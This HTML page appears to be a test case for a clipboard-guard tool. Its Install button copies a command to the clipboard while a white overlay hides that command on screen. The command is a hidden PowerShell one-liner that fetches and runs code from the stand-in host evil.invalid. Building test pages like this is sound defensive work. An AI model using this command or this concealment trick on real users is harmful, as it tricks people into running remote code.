<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8"><meta name="darkreader-lock"><title>Covered by an opaque layer</title>
<script src="common.js"></script>
<style>
.cover { position:absolute; inset:0; background:#fff; z-index:9; }
</style></head>
<body><h1>Covered by an opaque layer</h1>
<p>Click Install. The command is rendered on screen but cannot be read.</p>
<button id="go">Install</button>
<div style="position:relative"><pre id="cmd">powershell -w hidden -c "iwr https://evil.invalid/f2 | iex"</pre><div class="cover"></div></div>
<script>
const CMD = 'powershell -w hidden -c "iwr https://evil.invalid/f2 | iex"';
document.getElementById("go").addEventListener("click", () => window.__clipguard.writeText(CMD));
</script>
</body></html>
